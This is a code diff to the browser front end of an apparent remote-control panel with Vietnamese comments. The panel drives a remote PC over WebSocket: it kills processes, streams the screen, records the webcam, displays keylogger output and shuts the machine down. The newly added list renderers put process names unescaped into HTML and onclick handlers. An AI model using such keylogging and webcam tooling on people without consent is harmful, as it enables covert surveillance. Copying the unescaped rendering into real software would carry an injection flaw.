@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnStartRecord = $('#btn-start-record');
     const btnStopRecord = $('#btn-stop-record');
     const btnSaveVideo = $('#btn-save-video');
-    const btnReloadWebcam = $('#btn-reload-webcam'); // Nút Reload Webcam
+    const btnReloadWebcam = $('#btn-reload-webcam');
     const webcamSpinner = $('#webcam-spinner');
     const webcamPlaceholder = $('#webcam-placeholder');
     const webcamVideoOutput = $('#webcam-video-output');
@@ -32,7 +32,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Capture
     const btnTakeScreenshot = $('#btn-take-screenshot');
-    const btnReloadScreen = $('#btn-reload-screen'); // Nút Reload Screen
+    const btnReloadScreen = $('#btn-reload-screen');
     const btnSaveScreenshot = $('#btn-save-screenshot');
     const btnCopyScreenshot = $('#btn-copy-screenshot');
     const captureSpinner = $('#capture-spinner');
@@ -142,11 +142,34 @@ document.addEventListener('DOMContentLoaded', () => {
         else alert('Not connected.');
     }
 
+    // --- MAIN MESSAGE HANDLER ---
     function onWsMessage(event) {
         const msg = JSON.parse(event.data);
+        
+        // Kiểm tra xem các Modal Stop có đang mở không
+        const modalAppEl = document.getElementById('modal-stop-app');
+        const modalProcEl = document.getElementById('modal-stop-proc');
+        
+        const isStopAppOpen = modalAppEl && !modalAppEl.classList.contains('hidden');
+        const isStopProcOpen = modalProcEl && !modalProcEl.classList.contains('hidden');
+    
         switch (msg.type) {
-            case 'process_list': renderProcessTable(msg.data); break;
-            case 'application_list': renderAppTable(msg.data); break;
+            case 'process_list':
+                if (isStopProcOpen) {
+                    renderStopProcList(msg.data); // Vẽ vào modal nhỏ
+                } else {
+                    renderProcessTable(msg.data); // Vẽ vào bảng to
+                }
+                break;
+                
+            case 'application_list':
+                if (isStopAppOpen) {
+                    renderStopAppList(msg.data); // Vẽ vào modal nhỏ
+                } else {
+                    renderAppTable(msg.data); // Vẽ vào bảng to
+                }
+                break;
+            
             case 'screenshot':
                 captureSpinner.classList.add('hidden');
                 captureImg.src = `data:image/png;base64,${msg.data}`;
@@ -155,12 +178,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 btnCopyScreenshot.classList.remove('hidden');
                 btnSaveScreenshot.classList.remove('hidden');
                 break;
+            
             case 'screen_frame':
                 capturePlaceholder.parentElement.classList.add('hidden');
                 captureImg.classList.add('hidden');
                 streamImg.classList.remove('hidden');
                 streamImg.src = "data:image/jpeg;base64," + msg.data;
                 break;
+            
             case 'webcam_recording_status': handleWebcamStatus(msg); break;
             case 'webcam_video': handleWebcamVideo(msg.data); break;
             case 'webcam_frame': 
@@ -169,12 +194,17 @@ document.addEventListener('DOMContentLoaded', () => {
                  webcamStreamImg.classList.remove('hidden');
                  webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
                  break;
+            
             case 'key_event': handleKeyEvent(msg.key_code); break;
-            // case 'help': ... (Đã xóa)
+            
             case 'status':
                 if (msg.success) {
-                    if (currentView.includes('process')) loadDataForView('processes-table');
-                    if (currentView.includes('app')) loadDataForView('applications-table');
+                    // Nếu lệnh stop thành công, refresh lại đúng danh sách đang xem
+                    if (isStopAppOpen) sendWsMessage({command: 'list_applications'});
+                    if (isStopProcOpen) sendWsMessage({command: 'list_processes'});
+                    
+                    if (currentView.includes('process')) sendWsMessage({command: 'list_processes'});
+                    if (currentView.includes('app')) sendWsMessage({command: 'list_applications'});
                 } else {
                     if(msg.message === 'capture failed') {
                          captureSpinner.classList.add('hidden');
@@ -208,20 +238,81 @@ document.addEventListener('DOMContentLoaded', () => {
         ).join('');
     }
 
-    // --- KEYLOGGER (LOGIC ĐẦY ĐỦ) ---
+    // --- RENDER MODAL LISTS ---
+    function renderStopAppList(data) {
+        const container = $('#stop-app-list');
+        if (!data || data.length === 0) {
+            container.innerHTML = '<div class="list-loading">No running apps found.</div>';
+            return;
+        }
+        
+        container.innerHTML = data.map(app => `
+            <div class="list-item">
+                <div class="item-info">
+                    <span class="item-name">${app.name}</span>
+                    <span class="item-sub">${app.process_count} process(es)</span>
+                </div>
+                <button class="btn-kill-sm" onclick="requestStopApp('${app.name}')" title="Stop App">
+                    <i data-feather="power"></i>
+                </button>
+            </div>
+        `).join('');
+        
+        if(typeof feather !== 'undefined') feather.replace();
+    }
+    
+    function renderStopProcList(data) {
+        const container = $('#stop-proc-list');
+        if (!data || data.length === 0) {
+            container.innerHTML = '<div class="list-loading">No processes found.</div>';
+            return;
+        }
+    
+        // Giới hạn hiển thị 100 process để tránh lag
+        const displayData = data.slice(0, 100); 
+    
+        container.innerHTML = displayData.map(proc => `
+            <div class="list-item">
+                <div class="item-info">
+                    <span class="item-name">${proc.name}</span>
+                    <span class="item-sub">PID: ${proc.pid} | RAM: ${(proc.workingSet/1024/1024).toFixed(1)} MB</span>
+                </div>
+                <button class="btn-kill-sm" onclick="requestStopProc(${proc.pid})" title="Kill PID ${proc.pid}">
+                    <i data-feather="x"></i>
+                </button>
+            </div>
+        `).join('');
+        
+        if(data.length > 100) {
+            container.innerHTML += `<div class="list-loading" style="font-size:11px">...and ${data.length - 100} more processes</div>`;
+        }
+    
+        if(typeof feather !== 'undefined') feather.replace();
+    }
+
+    window.requestStopApp = (name) => {
+        if(confirm(`Force stop "${name}"?`)) {
+            if(ws) ws.send(JSON.stringify({command: 'stop_application', app_name: name}));
+        }
+    };
+    
+    window.requestStopProc = (pid) => {
+        if(confirm(`Kill process PID ${pid}?`)) {
+            if(ws) ws.send(JSON.stringify({command: 'stop_process_pid', pid: parseInt(pid)}));
+        }
+    };
+
+    // --- KEYLOGGER ---
     function handleKeyEvent(keyCode) {
         if (keyCode === 231) return;
 
         const el = $('#keylog-output');
 
-        // 2. Logic Xóa thông báo trạng thái (Dựa trên cờ isKeylogClean)
-        // Nếu đây là phím đầu tiên sau khi bật/tắt/kết nối -> Xóa sạch màn hình
         if (isKeylogClean) {
             el.textContent = '';
-            isKeylogClean = false; // Đánh dấu là đã xóa, các phím sau sẽ nối tiếp
+            isKeylogClean = false;
         }
 
-        // 3. Dịch mã phím
         function translateKeyCode(code) {
             if (code >= 65 && code <= 90) return String.fromCharCode(code);
             if (code >= 48 && code <= 57) return String.fromCharCode(code);
@@ -333,7 +424,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 case 222:
                     return "'";
                 case 91:
-                    return '[Win]';
+                    return '[LWin]';
+                case 92:
+                    return '[RWin]';
                 case 93:
                     return '[Menu]';
                 default:
@@ -351,19 +444,10 @@ document.addEventListener('DOMContentLoaded', () => {
         webcamStatus.textContent = msg.message;
         webcamStatus.classList.remove('hidden');
         if (msg.message.includes('Recording started')) {
-            btnStartRecord.classList.add('hidden'); 
-            btnStopRecord.classList.remove('hidden'); 
-            
-            btnStartWebcamStream.classList.add('hidden'); 
-            btnStopWebcamStream.classList.add('hidden');
-            
+            btnStartRecord.classList.add('hidden'); btnStopRecord.classList.remove('hidden'); 
+            btnStartWebcamStream.classList.add('hidden'); btnStopWebcamStream.classList.add('hidden');
             btnSaveVideo.classList.add('hidden');
-            webcamPlaceholder.parentElement.classList.add('hidden'); 
-            webcamSpinner.classList.remove('hidden'); 
-            webcamVideoOutput.classList.add('hidden');
-        } else if (msg.message.includes('streaming started')) {
-            btnStartWebcamStream.classList.add('hidden');
-            btnStopWebcamStream.classList.remove('hidden');
+            webcamPlaceholder.parentElement.classList.add('hidden'); webcamSpinner.classList.remove('hidden'); webcamVideoOutput.classList.add('hidden');
         } else if (msg.message.includes('completed')) {
              btnStartWebcamStream.classList.remove('hidden');
              webcamSpinner.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden'); webcamPlaceholder.textContent = 'Processing...';
@@ -423,145 +507,109 @@ document.addEventListener('DOMContentLoaded', () => {
         $('#main-content').onclick = e => {
             const card = e.target.closest('[data-action="show-view"]');
             if(card) showView(card.dataset.target);
+            
+            // Xử lý các nút stop trong bảng lớn
             const stopBtn = e.target.closest('[data-action="stop-proc"]');
             if(stopBtn) showConfirmModal('Stop Process', `PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({command:'stop_process_pid', pid: parseInt(stopBtn.dataset.pid)}));
             const stopAppBtn = e.target.closest('[data-action="stop-app"]');
             if(stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({command:'stop_application', app_name: stopAppBtn.dataset.name}));
         };
 
-        // === SCREEN CAPTURE LOGIC ===
-        btnTakeScreenshot.onclick = () => {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                sendWsMessage({ command: 'capture_screen' });
-                
-                captureSpinner.classList.remove('hidden');
-                captureImg.classList.add('hidden');
-                capturePlaceholder.parentElement.classList.add('hidden');
-                btnSaveScreenshot.classList.add('hidden');
-                btnCopyScreenshot.classList.add('hidden');
-            } else {
-                alert('Please connect to the server first!');
-            }
-        };
-        btnSaveScreenshot.onclick = () => {
-            const a = document.createElement('a'); a.href = captureImg.src; a.download = `screen-${Date.now()}.png`; a.click();
-        };
-        btnCopyScreenshot.onclick = async () => {
-            if (!captureImg.src || captureImg.classList.contains('hidden')) return;
-            try {
-                const response = await fetch(captureImg.src);
-                const blob = await response.blob();
-                const item = new ClipboardItem({ [blob.type]: blob });
-                await navigator.clipboard.write([item]);
-                alert('Đã copy ảnh vào Clipboard!');
-            } catch (err) {
-                console.warn('Copy Image API failed:', err);
-                try { await navigator.clipboard.writeText(captureImg.src.split(',')[1]); alert('Đã copy mã Base64 (Fallback)!'); } catch (e) { alert('Không thể copy. Kiểm tra HTTPS.'); }
-            }
-        };
-        
-        // === NÚT RELOAD SCREEN (RESET UI) ===
-        if (btnReloadScreen) {
-            btnReloadScreen.onclick = () => {
-                // Dừng Stream nếu có (để server ngừng gửi)
-                if(ws && ws.readyState === WebSocket.OPEN) sendWsMessage({ command: 'stop_screen_stream' });
-                
-                // Reset UI
-                captureImg.classList.add('hidden'); captureImg.src = '';
-                streamImg.classList.add('hidden'); streamImg.src = '';
-                capturePlaceholder.parentElement.classList.remove('hidden');
-                capturePlaceholder.textContent = 'Ready to capture/stream screen';
-                captureSpinner.classList.add('hidden');
-                
-                btnSaveScreenshot.classList.add('hidden');
-                btnCopyScreenshot.classList.add('hidden');
-                
-                btnStartStream.classList.remove('hidden');
-                btnStopStream.classList.add('hidden');
+        // STOP APPS
+        const cardStopApps = $('#card-open-stop-apps');
+        if (cardStopApps) {
+            cardStopApps.onclick = () => {
+                if(!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
+                showModal('modal-stop-app');
+                $('#stop-app-list').innerHTML = '<div class="list-loading"><div class="spinner"></div><br>Fetching Apps...</div>';
+                sendWsMessage({command: 'list_applications'});
             };
         }
 
-        // Screen Stream
-        btnStartStream.onclick = () => {
+        // KILL PROCESS
+        const cardStopProcs = $('#card-open-stop-procs');
+        if (cardStopProcs) {
+            cardStopProcs.onclick = () => {
+                if(!ws || ws.readyState !== WebSocket.OPEN) return alert("Connect first!");
+                showModal('modal-stop-proc');
+                $('#stop-proc-list').innerHTML = '<div class="list-loading"><div class="spinner"></div><br>Fetching Processes...</div>';
+                sendWsMessage({command: 'list_processes'});
+            };
+        }
+
+        // Screen Capture
+        btnTakeScreenshot.onclick = () => {
             if (ws && ws.readyState === WebSocket.OPEN) {
-                sendWsMessage({ command: 'start_screen_stream', fps: 10 });
-                
-                captureImg.classList.add('hidden'); 
-                streamImg.classList.remove('hidden'); 
-                capturePlaceholder.parentElement.classList.add('hidden');
-                btnStartStream.classList.add('hidden'); 
-                btnStopStream.classList.remove('hidden');
-            } else {
-                alert('Please connect to the server first!');
-            }
+                sendWsMessage({ command: 'capture_screen' });
+                captureSpinner.classList.remove('hidden'); captureImg.classList.add('hidden'); capturePlaceholder.parentElement.classList.add('hidden');
+                btnSaveScreenshot.classList.add('hidden'); btnCopyScreenshot.classList.add('hidden');
+            } else alert('Connect first');
+        };
+        btnSaveScreenshot.onclick = () => { const a = document.createElement('a'); a.href = captureImg.src; a.download = `screen-${Date.now()}.png`; a.click(); };
+        btnCopyScreenshot.onclick = async () => {
+            try {
+                const response = await fetch(captureImg.src); const blob = await response.blob();
+                await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]); alert('Copied!');
+            } catch (err) { await navigator.clipboard.writeText(captureImg.src.split(',')[1]); alert('Copied Base64'); }
+        };
+        
+        if (btnReloadScreen) {
+            btnReloadScreen.onclick = () => {
+                if(ws && ws.readyState === WebSocket.OPEN) sendWsMessage({ command: 'stop_screen_stream' });
+                captureImg.classList.add('hidden'); streamImg.classList.add('hidden');
+                capturePlaceholder.parentElement.classList.remove('hidden');
+                captureSpinner.classList.add('hidden'); btnSaveScreenshot.classList.add('hidden'); btnCopyScreenshot.classList.add('hidden');
+                btnStartStream.classList.remove('hidden'); btnStopStream.classList.add('hidden');
+            };
+        }
+
+        btnStartStream.onclick = () => {
+             if (ws && ws.readyState === WebSocket.OPEN) {
+                 sendWsMessage({ command: 'start_screen_stream', fps: 10 });
+                 captureImg.classList.add('hidden'); streamImg.classList.remove('hidden'); capturePlaceholder.parentElement.classList.add('hidden');
+                 btnStartStream.classList.add('hidden'); btnStopStream.classList.remove('hidden');
+             } else alert('Connect first');
         };
         btnStopStream.onclick = () => {
              sendWsMessage({ command: 'stop_screen_stream' });
-             streamImg.classList.add('hidden'); capturePlaceholder.parentElement.classList.remove('hidden'); capturePlaceholder.textContent = "Stream stopped";
+             streamImg.classList.add('hidden'); capturePlaceholder.parentElement.classList.remove('hidden');
              btnStartStream.classList.remove('hidden'); btnStopStream.classList.add('hidden');
         };
 
-        // === WEBCAM LOGIC ===
+        // Webcam
         btnStartRecord.onclick = () => showModal('modal-webcam-device');
         $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
              sendWsMessage({command: 'start_webcam_record', time: parseInt(inputWebcamDuration.value)||10, device_name: inputWebcamDeviceName.value});
              hideAllModals();
         };
         btnStopRecord.onclick = () => sendWsMessage({command: 'stop_webcam_record'});
-        btnSaveVideo.onclick = () => {
-            if(currentVideoBlob) { const a = document.createElement('a'); a.href = URL.createObjectURL(currentVideoBlob); a.download = `webcam-${Date.now()}.mp4`; a.click(); }
-        };
+        btnSaveVideo.onclick = () => { if(currentVideoBlob) { const a = document.createElement('a'); a.href = URL.createObjectURL(currentVideoBlob); a.download = `webcam-${Date.now()}.mp4`; a.click(); }};
 
-        // === NÚT RELOAD WEBCAM (RESET UI) ===
         if (btnReloadWebcam) {
             btnReloadWebcam.onclick = () => {
-                 // Dừng stream/record phía server
                  if(ws && ws.readyState === WebSocket.OPEN) {
                      sendWsMessage({ command: 'stop_webcam_stream' });
                      sendWsMessage({ command: 'stop_webcam_record' });
                  }
-
-                 // Reset UI
-                 webcamStreamImg.classList.add('hidden'); webcamStreamImg.src = '';
-                 webcamVideoOutput.classList.add('hidden'); webcamVideoOutput.src = '';
-                 webcamSpinner.classList.add('hidden');
-                 
-                 webcamPlaceholder.parentElement.classList.remove('hidden'); // Hiện empty state
-                 webcamPlaceholder.textContent = "Ready to record or stream webcam";
-                 webcamStatus.classList.add('hidden');
-
-                 btnStartWebcamStream.classList.remove('hidden');
-                 btnStopWebcamStream.classList.add('hidden');
-                 btnStartRecord.classList.remove('hidden');
-                 btnStopRecord.classList.add('hidden');
-                 btnSaveVideo.classList.add('hidden');
+                 webcamStreamImg.classList.add('hidden'); webcamVideoOutput.classList.add('hidden'); webcamSpinner.classList.add('hidden');
+                 webcamPlaceholder.parentElement.classList.remove('hidden'); webcamStatus.classList.add('hidden');
+                 btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden');
+                 btnStartRecord.classList.remove('hidden'); btnStopRecord.classList.add('hidden'); btnSaveVideo.classList.add('hidden');
             };
         }
 
-        // Webcam Stream
         btnStartWebcamStream.onclick = () => {
             if (ws && ws.readyState === WebSocket.OPEN) {
-                sendWsMessage({ command: 'start_webcam_stream', fps: 10 });
-                
-                webcamVideoOutput.classList.add('hidden'); 
-                webcamStreamImg.classList.remove('hidden'); 
-                webcamPlaceholder.parentElement.classList.add('hidden'); 
-                btnSaveVideo.classList.add('hidden');
-                
-                btnStartRecord.classList.add('hidden'); 
-                btnStopRecord.classList.add('hidden');
-                
-                btnStartWebcamStream.classList.add('hidden'); 
-                btnStopWebcamStream.classList.remove('hidden');
-                
+                sendWsMessage({ command: 'start_webcam_stream', fps: 15 });
+                webcamVideoOutput.classList.add('hidden'); webcamStreamImg.classList.remove('hidden'); webcamPlaceholder.parentElement.classList.add('hidden'); btnSaveVideo.classList.add('hidden');
+                btnStartRecord.classList.add('hidden'); btnStopRecord.classList.add('hidden');
+                btnStartWebcamStream.classList.add('hidden'); btnStopWebcamStream.classList.remove('hidden');
                 $('#webcam-display-area .empty-state').classList.add('hidden');
-            } else {
-                alert('Please connect to the server first!');
-            }
+            } else alert('Connect first');
         };
         btnStopWebcamStream.onclick = () => {
             sendWsMessage({ command: 'stop_webcam_stream' });
-            webcamStreamImg.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden'); webcamPlaceholder.textContent = "Ready";
+            webcamStreamImg.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden');
             btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); btnStartRecord.classList.remove('hidden');
         };
 
@@ -574,7 +622,7 @@ document.addEventListener('DOMContentLoaded', () => {
         };
         if(btnClearKeylog) btnClearKeylog.onclick = () => { keylogOutput.textContent = 'Cleared.'; isKeylogClean = true; };
 
-        // Modals
+        // Modals Common
         $('#btn-start-process').onclick = () => showModal('modal-start-process');
         $('#btn-start-app').onclick = () => showModal('modal-start-app');
         $('#modal-backdrop').onclick = hideAllModals;
@@ -587,11 +635,10 @@ document.addEventListener('DOMContentLoaded', () => {
             sendWsMessage({command:'start_application', app_name: $('#input-app-name').value}); hideAllModals();
         };
 
-        // System
         if($('#btn-system-restart')) $('#btn-system-restart').onclick = () => showConfirmModal('Restart', 'Restart remote PC?', 'danger', () => sendWsMessage({command: 'system_restart'}));
         if($('#btn-system-shutdown')) $('#btn-system-shutdown').onclick = () => showConfirmModal('Shutdown', 'Shutdown remote PC?', 'danger', () => sendWsMessage({command: 'system_shutdown'}));
 
-        // Traffic Lights & Theme
+        // Theme & Traffic
         $('.dot.red').onclick = () => { if(ws) disconnectWs(); };
         $('.dot.yellow').onclick = () => { if(themeToggle) themeToggle.click(); }; 
         $('.dot.green').onclick = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
@@ -611,12 +658,6 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- START ---
     init();
     
-    if (typeof feather !== 'undefined') {
-        feather.replace();
-    } else {
-        console.warn("Feather Icons not loaded yet. Retrying in 500ms...");
-        setTimeout(() => { if(typeof feather !== 'undefined') feather.replace(); }, 500);
-    }
-    
+    setTimeout(() => { if(typeof feather !== 'undefined') feather.replace(); }, 500);
     showView(currentView);
 });
